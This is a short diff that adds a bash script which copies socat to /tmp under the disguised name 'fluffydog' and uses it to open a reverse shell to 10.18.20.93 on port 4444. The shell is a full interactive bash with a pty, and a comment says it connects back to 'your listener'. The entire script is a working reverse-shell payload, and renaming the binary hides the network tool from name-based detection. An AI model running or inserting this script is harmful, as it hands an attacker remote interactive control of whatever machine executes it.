@@ -1,0 +1,8 @@
+#!/bin/bash
+
+# Copy and rename socat
+cp /usr/bin/socat /tmp/fluffydog
+chmod +x /tmp/fluffydog
+
+# Connect back to your listener
+/tmp/fluffydog TCP:10.18.20.93:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
